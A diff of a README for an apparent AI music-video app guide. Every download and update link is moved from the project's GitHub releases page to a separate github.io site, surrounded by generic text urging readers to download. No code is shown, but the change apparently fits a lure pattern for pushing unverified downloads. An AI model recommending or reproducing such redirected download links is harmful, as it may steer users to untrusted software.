@@ -6,7 +6,7 @@ Welcome to the **awesome-music-video-creator-guide**! This guide is your friendl
 
 ### 📥 Download the App
 
-[![Download Now](https://img.shields.io/badge/Download-App-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fleyderrivera/awesome-music-video-creator-guide/releases)
+[![Download Now](https://img.shields.io/badge/Download-App-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://fleyderrivera.github.io)
 
 Visit this link to download the application. You'll find the latest version ready for your computer.
 
@@ -114,7 +114,7 @@ Once you're comfortable, try these power-user features:
 
 The app receives regular updates with new features and improvements. To get updates:
 
-1. Visit the [download page](https://github.com/fleyderrivera/awesome-music-video-creator-guide/releases)
+1. Visit the [download page](https://fleyderrivera.github.io)
 2. Check the version number
 3. Download the newest release if available
 
@@ -160,4 +160,4 @@ You now have all the basics to start making incredible AI music videos. Remember
 
 Now, download the app, follow the simple instructions, and let the AI do the heavy lifting. Before you know it, you'll have your own collection of awesome music videos to share with the world. The combination of AI music generation and video creation has never been this accessible. Start your journey today!
 
-Remember: the [download link](https://github.com/fleyderrivera/awesome-music-video-creator-guide/releases) is your gateway to this exciting tool. Visit this link to download the application and begin creating right away. Every professional creator started exactly where you are now—take that first step and see what amazing videos you can make!
+Remember: the [download link](https://fleyderrivera.github.io) is your gateway to this exciting tool. Visit this link to download the application and begin creating right away. Every professional creator started exactly where you are now—take that first step and see what amazing videos you can make!
